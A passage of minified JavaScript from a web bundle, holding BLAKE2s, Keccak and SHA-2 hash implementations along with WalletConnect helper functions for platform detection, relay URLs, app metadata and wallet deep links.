E=0;for(E=0;E<8;E++)o[E]=w.h[E],o[E+8]=i[E];for(o[12]^=w.t,o[13]^=w.t/4294967296,y&&(o[14]=~o[14]),E=0;E<16;E++)a[E]=e(w.b,4*E);for(E=0;E<10;E++)n(0,4,8,12,a[s[E*16+0]],a[s[E*16+1]]),n(1,5,9,13,a[s[E*16+2]],a[s[E*16+3]]),n(2,6,10,14,a[s[E*16+4]],a[s[E*16+5]]),n(3,7,11,15,a[s[E*16+6]],a[s[E*16+7]]),n(0,5,10,15,a[s[E*16+8]],a[s[E*16+9]]),n(1,6,11,12,a[s[E*16+10]],a[s[E*16+11]]),n(2,7,8,13,a[s[E*16+12]],a[s[E*16+13]]),n(3,4,9,14,a[s[E*16+14]],a[s[E*16+15]]);for(E=0;E<8;E++)w.h[E]^=o[E]^o[E+8]}function l(w,y){if(!(w>0&&w<=32))throw new Error("Incorrect output length, should be in [1, 32]");const E=y?y.length:0;if(y&&!(E>0&&E<=32))throw new Error("Incorrect key length, should be in [1, 32]");const A={h:new Uint32Array(i),b:new Uint8Array(64),c:0,t:0,outlen:w};return A.h[0]^=16842752^E<<8^w,E>0&&(f(A,y),A.c=64),A}function f(w,y){for(let E=0;E<y.length;E++)w.c===64&&(w.t+=w.c,c(w,!1),w.c=0),w.b[w.c++]=y[E]}function h(w){for(w.t+=w.c;w.c<64;)w.b[w.c++]=0;c(w,!0);const y=new Uint8Array(w.outlen);for(let E=0;E<w.outlen;E++)y[E]=w.h[E>>2]>>8*(E&3)&255;return y}function m(w,y,E){E=E||32,w=t.normalizeInput(w);const A=l(E,y);return f(A,w),h(A)}function b(w,y,E){const A=m(w,y,E);return t.toHex(A)}return h9={blake2s:m,blake2sHex:b,blake2sInit:l,blake2sUpdate:f,blake2sFinal:h},h9}var p9,Lz;function t6e(){if(Lz)return p9;Lz=1;const t=X3e(),e=e6e();return p9={blake2b:t.blake2b,blake2bHex:t.blake2bHex,blake2bInit:t.blake2bInit,blake2bUpdate:t.blake2bUpdate,blake2bFinal:t.blake2bFinal,blake2s:e.blake2s,blake2sHex:e.blake2sHex,blake2sInit:e.blake2sInit,blake2sUpdate:e.blake2sUpdate,blake2sFinal:e.blake2sFinal},p9}var n6e=t6e(),r6e={};const i6e=":";function _f(t){const[e,n]=t.split(i6e);return{namespace:e,reference:n}}function Tse(t,e){return t.includes(":")?[t]:e.chains||[]}var s6e=Object.defineProperty,o6e=Object.defineProperties,a6e=Object.getOwnPropertyDescriptors,Fz=Object.getOwnPropertySymbols,c6e=Object.prototype.hasOwnProperty,u6e=Object.prototype.propertyIsEnumerable,i7=(t,e,n)=>e in t?s6e(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,$z=(t,e)=>{for(var n in e||(e={}))c6e.call(e,n)&&i7(t,n,e[n]);if(Fz)for(var n of Fz(e))u6e.call(e,n)&&i7(t,n,e[n]);return t},l6e=(t,e)=>o6e(t,a6e(e)),Hz=(t,e,n)=>i7(t,typeof e!="symbol"?e+"":e,n);const d6e="ReactNative",Za={reactNative:"react-native",node:"node",browser:"browser",unknown:"unknown"},f6e="js";function Px(){return typeof process<"u"&&typeof process.versions<"u"&&typeof process.versions.node<"u"}function Gp(){return!Pf.getDocument()&&!!Pf.getNavigator()&&navigator.product===d6e}function h6e(){return Gp()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="android"}function p6e(){return Gp()&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"&&(global==null?void 0:global.Platform.OS)==="ios"}function iw(){return!Px()&&!!Pf.getNavigator()&&!!Pf.getDocument()}function X_(){return Gp()?Za.reactNative:Px()?Za.node:iw()?Za.browser:Za.unknown}function zz(){var t;try{return Gp()&&typeof global<"u"&&typeof(global==null?void 0:global.Application)<"u"?(t=global.Application)==null?void 0:t.applicationId:void 0}catch{return}}function m6e(t,e){const n=new URLSearchParams(t);return Object.entries(e).sort(([r],[i])=>r.localeCompare(i)).forEach(([r,i])=>{i!=null&&n.set(r,String(i))}),n.toString()}function g6e(t){var e,n;const r=xse();try{return t!=null&&t.url&&r.url&&new URL(t.url).host!==new URL(r.url).host&&(console.warn(`The configured WalletConnect 'metadata.url':${t.url} differs from the actual page url:${r.url}. This is probably unintended and can lead to issues.`),t.url=r.url),(e=t?.icons)!=null&&e.length&&t.icons.length>0&&(t.icons=t.icons.filter(i=>i!=="")),l6e($z($z({},r),t),{url:t?.url||r.url,name:t?.name||r.name,description:t?.description||r.description,icons:(n=t?.icons)!=null&&n.length&&t.icons.length>0?t.icons:r.icons})}catch(i){return console.warn("Error populating app metadata",i),t||r}}function xse(){return l_e.getWindowMetadata()||{name:"",description:"",url:"",icons:[""]}}function y6e(){if(X_()===Za.reactNative&&typeof global<"u"&&typeof(global==null?void 0:global.Platform)<"u"){const{OS:n,Version:r}=global.Platform;return[n,r].join("-")}const t=r_e();if(t===null)return"unknown";const e=t.os?t.os.replace(" ","").toLowerCase():"unknown";return t.type==="browser"?[e,t.name,t.version].join("-"):[e,t.version].join("-")}function b6e(){var t;const e=X_();return e===Za.browser?[e,((t=Pf.getLocation())==null?void 0:t.host)||"unknown"].join(":"):e}function Ise(t,e,n){const r=y6e(),i=b6e();return[[t,e].join("-"),[f6e,n].join("-"),r,i].join("/")}function w6e({protocol:t,version:e,relayUrl:n,sdkVersion:r,auth:i,projectId:s,useOnCloseEvent:o,bundleId:a,packageName:c}){const l=n.split("?"),f=Ise(t,e,r),h={auth:i,ua:f,projectId:s,useOnCloseEvent:o,packageName:c||void 0,bundleId:a||void 0},m=m6e(l[1]||"",h);return l[0]+"?"+m}function jm(t,e){return t.filter(n=>e.includes(n)).length===t.length}function s7(t){return Object.fromEntries(t.entries())}function o7(t){return new Map(Object.entries(t))}function Am(t=Ye.FIVE_MINUTES,e){const n=Ye.toMiliseconds(t||Ye.FIVE_MINUTES);let r,i,s,o;return{resolve:a=>{s&&r&&(clearTimeout(s),r(a),o=Promise.resolve(a))},reject:a=>{s&&i&&(clearTimeout(s),i(a))},done:()=>new Promise((a,c)=>{if(o)return a(o);s=setTimeout(()=>{const l=new Error(e);o=Promise.reject(l),c(l)},n),r=a,i=c})}}function jl(t,e,n){return new Promise(async(r,i)=>{const s=setTimeout(()=>i(new Error(n)),e);try{const o=await t;r(o)}catch(o){i(o)}clearTimeout(s)})}function Rse(t,e){if(typeof e=="string"&&e.startsWith(`${t}:`))return e;if(t.toLowerCase()==="topic"){if(typeof e!="string")throw new Error('Value must be "string" for expirer target type: topic');return`topic:${e}`}else if(t.toLowerCase()==="id"){if(typeof e!="number")throw new Error('Value must be "number" for expirer target type: id');return`id:${e}`}throw new Error(`Unknown expirer target type: ${t}`)}function v6e(t){return Rse("topic",t)}function E6e(t){return Rse("id",t)}function Pse(t){const[e,n]=t.split(":"),r={id:void 0,topic:void 0};if(e==="topic"&&typeof n=="string")r.topic=n;else if(e==="id"&&Number.isInteger(Number(n)))r.id=Number(n);else throw new Error(`Invalid target, expected id:number or topic:string, got ${e}:${n}`);return r}function Ii(t,e){return Ye.fromMiliseconds(Date.now()+Ye.toMiliseconds(t))}function Ol(t){return Date.now()>=Ye.toMiliseconds(t)}function Jn(t,e){return`${t}${e?`:${e}`:""}`}function Ll(t=[],e=[]){return[...new Set([...t,...e])]}async function _6e({id:t,topic:e,wcDeepLink:n}){var r;try{if(!n)return;const i=typeof n=="string"?JSON.parse(n):n,s=i?.href;if(typeof s!="string")return;const o=A6e(s,t,e),a=X_();if(a===Za.browser){if(!((r=Pf.getDocument())!=null&&r.hasFocus())){console.warn("Document does not have focus, skipping deeplink.");return}C6e(o)}else a===Za.reactNative&&typeof(global==null?void 0:global.Linking)<"u"&&await global.Linking.openURL(o)}catch(i){console.error(i)}}function A6e(t,e,n){const r=`requestId=${e}&sessionTopic=${n}`;t.endsWith("/")&&(t=t.slice(0,-1));let i=`${t}`;if(t.startsWith("https://t.me")){const s=t.includes("?")?"&startapp=":"?startapp=";i=`${i}${s}${I6e(r,!0)}`}else i=`${i}/wc?${r}`;return i}function C6e(t){let e="_self";x6e()?e="_top":(T6e()||t.startsWith("https://")||t.startsWith("http://"))&&(e="_blank"),window.open(t,e,"noreferrer noopener")}async function S6e(t,e){let n="";try{if(iw()&&(n=localStorage.getItem(e),n))return n;n=await t.getItem(e)}catch(r){console.error(r)}return n}function qz(t,e){if(!t.includes(e))return null;const n=t.split(/([&,?,=])/),r=n.indexOf(e);return n[r+2]}function Vz(){return typeof crypto<"u"&&crypto!=null&&crypto.randomUUID?crypto.randomUUID():"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu,t=>{const e=Math.random()*16|0;return(t==="x"?e:e&3|8).toString(16)})}function CB(){return typeof process<"u"&&r6e.IS_VITEST==="true"}function T6e(){return typeof window<"u"&&(!!window.TelegramWebviewProxy||!!window.Telegram||!!window.TelegramWebviewProxyProto)}function x6e(){try{return window.self!==window.top}catch{return!1}}function I6e(t,e=!1){const n=Buffer.from(t).toString("base64");return e?n.replace(/[=]/g,""):n}function Nse(t){return Buffer.from(t,"base64").toString("utf-8")}function R6e(t){return new Promise(e=>setTimeout(e,t))}let P6e=class{constructor({limit:e}){Hz(this,"limit"),Hz(this,"set"),this.limit=e,this.set=new Set}add(e){if(!this.set.has(e)){if(this.set.size>=this.limit){const n=this.set.values().next().value;n&&this.set.delete(n)}this.set.add(e)}}has(e){return this.set.has(e)}};const z3=BigInt(2**32-1),Wz=BigInt(32);function Ose(t,e=!1){return e?{h:Number(t&z3),l:Number(t>>Wz&z3)}:{h:Number(t>>Wz&z3)|0,l:Number(t&z3)|0}}function kse(t,e=!1){const n=t.length;let r=new Uint32Array(n),i=new Uint32Array(n);for(let s=0;s<n;s++){const{h:o,l:a}=Ose(t[s],e);[r[s],i[s]]=[o,a]}return[r,i]}const Gz=(t,e,n)=>t>>>n,Kz=(t,e,n)=>t<<32-n|e>>>n,ap=(t,e,n)=>t>>>n|e<<32-n,cp=(t,e,n)=>t<<32-n|e>>>n,W2=(t,e,n)=>t<<64-n|e>>>n-32,G2=(t,e,n)=>t>>>n-32|e<<64-n,N6e=(t,e)=>e,O6e=(t,e)=>t,k6e=(t,e,n)=>t<<n|e>>>32-n,D6e=(t,e,n)=>e<<n|t>>>32-n,B6e=(t,e,n)=>e<<n-32|t>>>64-n,j6e=(t,e,n)=>t<<n-32|e>>>64-n;function Au(t,e,n,r){const i=(e>>>0)+(r>>>0);return{h:t+n+(i/2**32|0)|0,l:i|0}}const SB=(t,e,n)=>(t>>>0)+(e>>>0)+(n>>>0),TB=(t,e,n,r)=>e+n+r+(t/2**32|0)|0,M6e=(t,e,n,r)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0),U6e=(t,e,n,r,i)=>e+n+r+i+(t/2**32|0)|0,L6e=(t,e,n,r,i)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0)+(i>>>0),F6e=(t,e,n,r,i,s)=>e+n+r+i+s+(t/2**32|0)|0,ib=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;function ZI(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function Nf(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function Lu(t,...e){if(!ZI(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function YI(t){if(typeof t!="function"||typeof t.create!="function")throw new Error("Hash should be wrapped by utils.createHasher");Nf(t.outputLen),Nf(t.blockLen)}function Op(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function xB(t,e){Lu(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}function c_(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function Fc(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}function m9(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}function vl(t,e){return t<<32-e|t>>>e}const Dse=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function Bse(t){return t<<24&4278190080|t<<8&16711680|t>>>8&65280|t>>>24&255}const sf=Dse?t=>t:t=>Bse(t);function $6e(t){for(let e=0;e<t.length;e++)t[e]=Bse(t[e]);return t}const up=Dse?t=>t:$6e,jse=typeof Uint8Array.from([]).toHex=="function"&&typeof Uint8Array.fromHex=="function",H6e=Array.from({length:256},(t,e)=>e.toString(16).padStart(2,"0"));function e1(t){if(Lu(t),jse)return t.toHex();let e="";for(let n=0;n<t.length;n++)e+=H6e[t[n]];return e}const Md={_0:48,_9:57,A:65,F:70,a:97,f:102};function Zz(t){if(t>=Md._0&&t<=Md._9)return t-Md._0;if(t>=Md.A&&t<=Md.F)return t-(Md.A-10);if(t>=Md.a&&t<=Md.f)return t-(Md.a-10)}function Nx(t){if(typeof t!="string")throw new Error("hex string expected, got "+typeof t);if(jse)return Uint8Array.fromHex(t);const e=t.length,n=e/2;if(e%2)throw new Error("hex string expected, got unpadded hex of length "+e);const r=new Uint8Array(n);for(let i=0,s=0;i<n;i++,s+=2){const o=Zz(t.charCodeAt(s)),a=Zz(t.charCodeAt(s+1));if(o===void 0||a===void 0){const c=t[s]+t[s+1];throw new Error('hex string expected, got non-hex character "'+c+'" at index '+s)}r[i]=o*16+a}return r}function Mse(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function Mu(t){return typeof t=="string"&&(t=Mse(t)),Lu(t),t}function fp(...t){let e=0;for(let r=0;r<t.length;r++){const i=t[r];Lu(i),e+=i.length}const n=new Uint8Array(e);for(let r=0,i=0;r<t.length;r++){const s=t[r];n.set(s,i),i+=s.length}return n}let QI=class{};function eA(t){const e=r=>t().update(Mu(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function z6e(t){const e=(r,i)=>t(i).update(Mu(r)).digest(),n=t({});return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=r=>t(r),e}function Hg(t=32){if(ib&&typeof ib.getRandomValues=="function")return ib.getRandomValues(new Uint8Array(t));if(ib&&typeof ib.randomBytes=="function")return Uint8Array.from(ib.randomBytes(t));throw new Error("crypto.getRandomValues must be defined")}const q6e=BigInt(0),Tv=BigInt(1),V6e=BigInt(2),W6e=BigInt(7),G6e=BigInt(256),K6e=BigInt(113),Use=[],Lse=[],Fse=[];for(let t=0,e=Tv,n=1,r=0;t<24;t++){[n,r]=[r,(2*n+3*r)%5],Use.push(2*(5*r+n)),Lse.push((t+1)*(t+2)/2%64);let i=q6e;for(let s=0;s<7;s++)e=(e<<Tv^(e>>W6e)*K6e)%G6e,e&V6e&&(i^=Tv<<(Tv<<BigInt(s))-Tv);Fse.push(i)}const $se=kse(Fse,!0),Z6e=$se[0],Y6e=$se[1],Yz=(t,e,n)=>n>32?B6e(t,e,n):k6e(t,e,n),Qz=(t,e,n)=>n>32?j6e(t,e,n):D6e(t,e,n);function Q6e(t,e=24){const n=new Uint32Array(10);for(let r=24-e;r<24;r++){for(let o=0;o<10;o++)n[o]=t[o]^t[o+10]^t[o+20]^t[o+30]^t[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=n[c],f=n[c+1],h=Yz(l,f,1)^n[a],m=Qz(l,f,1)^n[a+1];for(let b=0;b<50;b+=10)t[o+b]^=h,t[o+b+1]^=m}let i=t[2],s=t[3];for(let o=0;o<24;o++){const a=Lse[o],c=Yz(i,s,a),l=Qz(i,s,a),f=Use[o];i=t[f],s=t[f+1],t[f]=c,t[f+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)n[a]=t[o+a];for(let a=0;a<10;a++)t[o+a]^=~n[(a+2)%10]&n[(a+4)%10]}t[0]^=Z6e[r],t[1]^=Y6e[r]}Fc(n)}let J6e=class Hse extends QI{constructor(e,n,r,i=!1,s=24){if(super(),this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,this.enableXOF=!1,this.blockLen=e,this.suffix=n,this.outputLen=r,this.enableXOF=i,this.rounds=s,Nf(r),!(0<e&&e<200))throw new Error("only keccak-f1600 function is supported");this.state=new Uint8Array(200),this.state32=c_(this.state)}clone(){return this._cloneInto()}keccak(){up(this.state32),Q6e(this.state32,this.rounds),up(this.state32),this.posOut=0,this.pos=0}update(e){Op(this),e=Mu(e),Lu(e);const{blockLen:n,state:r}=this,i=e.length;for(let s=0;s<i;){const o=Math.min(n-this.pos,i-s);for(let a=0;a<o;a++)r[this.pos++]^=e[s++];this.pos===n&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:n,pos:r,blockLen:i}=this;e[r]^=n,(n&128)!==0&&r===i-1&&this.keccak(),e[i-1]^=128,this.keccak()}writeInto(e){Op(this,!1),Lu(e),this.finish();const n=this.state,{blockLen:r}=this;for(let i=0,s=e.length;i<s;){this.posOut>=r&&this.keccak();const o=Math.min(r-this.posOut,s-i);e.set(n.subarray(this.posOut,this.posOut+o),i),this.posOut+=o,i+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return Nf(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(xB(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,Fc(this.state)}_cloneInto(e){const{blockLen:n,suffix:r,outputLen:i,rounds:s,enableXOF:o}=this;return e||(e=new Hse(n,r,i,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=r,e.outputLen=i,e.enableXOF=o,e.destroyed=this.destroyed,e}};const X6e=(t,e,n)=>eA(()=>new J6e(e,t,n)),eCe=X6e(1,136,256/8);function tCe(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(n>>i&s),a=Number(n&s),c=r?4:0,l=r?0:4;t.setUint32(e+c,o,r),t.setUint32(e+l,a,r)}function nCe(t,e,n){return t&e^~t&n}function rCe(t,e,n){return t&e^t&n^e&n}let zse=class extends QI{constructor(e,n,r,i){super(),this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.buffer=new Uint8Array(e),this.view=m9(this.buffer)}update(e){Op(this),e=Mu(e),Lu(e);const{view:n,buffer:r,blockLen:i}=this,s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=m9(e);for(;i<=s-o;o+=i)this.process(c,o);continue}r.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){Op(this),xB(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:s}=this;let{pos:o}=this;n[o++]=128,Fc(this.buffer.subarray(o)),this.padOffset>i-o&&(this.process(r,0),o=0);for(let h=o;h<i;h++)n[h]=0;tCe(r,i-8,BigInt(this.length*8),s),this.process(r,0);const a=m9(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,f=this.get();if(l>f.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,f[h],s)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:s,destroyed:o,pos:a}=this;return e.destroyed=o,e.finished=s,e.length=i,e.pos=a,i%n&&e.buffer.set(r),e}clone(){return this._cloneInto()}};const Hh=Uint32Array.from([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),Ls=Uint32Array.from([3418070365,3238371032,1654270250,914150663,2438529370,812702999,355462360,4144912697,1731405415,4290775857,2394180231,1750603025,3675008525,1694076839,1203062813,3204075428]),Fs=Uint32Array.from([1779033703,4089235720,3144134277,2227873595,1013904242,4271175723,2773480762,1595750129,1359893119,2917565137,2600822924,725511199,528734635,4215389547,1541459225,327033209]),iCe=Uint32Array.from([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),zh=new Uint32Array(64);class sCe extends zse{constructor(e=32){super(64,e,8,!1),this.A=Hh[0]|0,this.B=Hh[1]|0,this.C=Hh[2]|0,this.D=Hh[3]|0,this.E=Hh[4]|0,this.F=Hh[5]|0,this.G=Hh[6]|0,this.H=Hh[7]|0}get(){const{A:e,B:n,C:r,D:i,E:s,F:o,G:a,H:c}=this;return[e,n,r,i,s,o,a,c]}set(e,n,r,i,s,o,a,c){this.A=e|0,this.B=n|0,this.C=r|0,this.D=i|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,n){for(let h=0;h<16;h++,n+=4)zh[h]=e.getUint32(n,!1);for(let h=16;h<64;h++){const m=zh[h-15],b=zh[h-2],w=vl(m,7)^vl(m,18)^m>>>3,y=vl(b,17)^vl(b,19)^b>>>10;zh[h]=y+zh[h-7]+w+zh[h-16]|0}let{A:r,B:i,C:s,D:o,E:a,F:c,G:l,H:f}=this;for(let h=0;h<64;h++){const m=vl(a,6)^vl(a,11)^vl(a,25),b=f+m+nCe(a,c,l)+iCe[h]+zh[h]|0,w=(vl(r,2)^vl(r,13)^vl(r,22))+rCe(r,i,s)|0;f=l,l=c,c=a,a=o+b|0,o=s,s=i,i=r,r=b+w|0}r=r+this.A|0,i=i+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,f=f+this.H|0,this.set(r,i,s,o,a,c,l,f)}roundClean(){Fc(zh)}destroy(){this.set(0,0,0,0,0,0,0,0),Fc(this.buffer)}}const qse=kse(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),oCe=qse[0],aCe=qse[1],qh=new Uint32Array(80),Vh=new Uint32Array(80);let IB=class extends zse{constructor(e=64){super(128,e,16,!1),this.Ah=Fs[0]|0,this.Al=Fs[1]|0,this.Bh=Fs[2]|0,this.Bl=Fs[3]|0,this.Ch=Fs[4]|0,this.Cl=Fs[5]|0,this.Dh=Fs[6]|0,this.Dl=Fs[7]|0,this.Eh=Fs[8]|0,this.El=Fs[9]|0,this.Fh=Fs[10]|0,this.Fl=Fs[11]|0,this.Gh=Fs[12]|0,this.Gl=Fs[13]|0,this.Hh=Fs[14]|0,this.Hl=Fs[15]|0}get(){const{Ah:e,Al:n,Bh:r,Bl:i,Ch:s,Cl:o,Dh:a,Dl:c,Eh:l,El:f,Fh:h,Fl:m,Gh:b,Gl:w,Hh:y,Hl:E}=this;return[e,n,r,i,s,o,a,c,l,f,h,m,b,w,y,E]}set(e,n,r,i,s,o,a,c,l,f,h,m,b,w,y,E){this.Ah=e|0,this.Al=n|0,this.Bh=r|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=l|0,this.El=f|0,this.Fh=h|0,this.Fl=m|0,this.Gh=b|0,this.Gl=w|0,this.Hh=y|0,this.Hl=E|0}process(e,n){for(let S=0;S<16;S++,n+=4)qh[S]=e.getUint32(n),Vh[S]=e.getUint32(n+=4);for(let S=16;S<80;S++){const v=qh[S-15]|0,k=Vh[S-15]|0,O=ap(v,k,1)^ap(v,k,8)^Gz(v,k,7),_=cp(v,k,1)^cp(v,k,8)^Kz(v,k,7),I=qh[S-2]|0,T=Vh[S-2]|0,B=ap(I,T,19)^W2(I,T,61)^Gz(I,T,6),U=cp(I,T,19)^G2(I,T,61)^Kz(I,T,6),M=M6e(_,U,Vh[S-7],Vh[S-16]),N=U6e(M,O,B,qh[S-7],qh[S-16]);qh[S]=N|0,Vh[S]=M|0}let{Ah:r,Al:i,Bh:s,Bl:o,Ch:a,Cl:c,Dh:l,Dl:f,Eh:h,El:m,Fh:b,Fl:w,Gh:y,Gl:E,Hh:A,Hl:R}=this;for(let S=0;S<80;S++){const v=ap(h,m,14)^ap(h,m,18)^W2(h,m,41),k=cp(h,m,14)^cp(h,m,18)^G2(h,m,41),O=h&b^~h&y,_=m&w^~m&E,I=L6e(R,k,_,aCe[S],Vh[S]),T=F6e(I,A,v,O,oCe[S],qh[S]),B=I|0,U=ap(r,i,28)^W2(r,i,34)^W2(r,i,39),M=cp(r,i,28)^G2(r,i,34)^G2(r,i,39),N=r&s^r&a^s&a,q=i&o^i&c^o&c;A=y|0,R=E|0,y=b|0,E=w|0,b=h|0,w=m|0,{h,l:m}=Au(l|0,f|0,T|0,B|0),l=a|0,f=c|0,a=s|0,c=o|0,s=r|0,o=i|0;const P=SB(B,M,q);r=TB(P,T,U,N),i=P|0}({h:r,l:i}=Au(this.Ah|0,this.Al|0,r|0,i|0)),{h:s,l:o}=Au(this.Bh|0,this.Bl|0,s|0,o|0),{h:a,l:c}=Au(this.Ch|0,this.Cl|0,a|0,c|0),{h:l,l:f}=Au(this.Dh|0,this.Dl|0,l|0,f|0),{h,l:m}=Au(this.Eh|0,this.El|0,h|0,m|0),{h:b,l:w}=Au(this.Fh|0,this.Fl|0,b|0,w|0),{h:y,l:E}=Au(this.Gh|0,this.Gl|0,y|0,E|0),{h:A,l:R}=Au(this.Hh|0,this.Hl|0,A|0,R|0),this.set(r,i,s,o,a,c,l,f,h,m,b,w,y,E,A,R)}roundClean(){Fc(qh,Vh)}destroy(){Fc(this.buffer),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}};class cCe extends IB{constructor(){super(48),this.Ah=Ls[0]|0,this.Al=Ls[1]|0,this.Bh=Ls[2]|0,this.Bl=Ls[3]|0,this.Ch=Ls[4]|0,this.Cl=Ls[5]|0,this.Dh=Ls[6]|0,this.Dl=Ls[7]|0,this.Eh=Ls[8]|0,this.El=Ls[9]|0,this.Fh=Ls[10]|0,this.Fl=Ls[11]|0,this.Gh=Ls[12]|0,this.Gl=Ls[13]|0,this.Hh=Ls[14]|0,this.Hl=Ls[15]|0}}const $s=Uint32Array.from([573645204,4230739756,2673172387,3360449730,596883563,1867755857,2520282905,1497426621,2519219938,2827943907,3193839141,1401305490,721525244,746961066,246885852,2177182882]);class uCe extends IB{constructor(){super(32),this.Ah=$s[0]|0,this.Al=$s[1]|0,this.Bh=$s[2]|0,this.Bl=$s[3]|0,this.Ch=$s[4]|0,this.Cl=$s[5]|0,this.Dh=$s[6]|0,this.Dl=$s[7]|0,this.Eh=$s[8]|0,this.El=$s[9]|0,this.Fh=$s[10]|0,this.Fl=$s[11]|0,this.Gh=$s[12]|0,this.Gl=$s[13]|0,this.Hh=$s[14]|0,this.Hl=$s[15]|0}}const JI=eA(()=>new sCe),lCe=eA(()=>new IB),dCe=eA(()=>new cCe),fCe=eA(()=>new 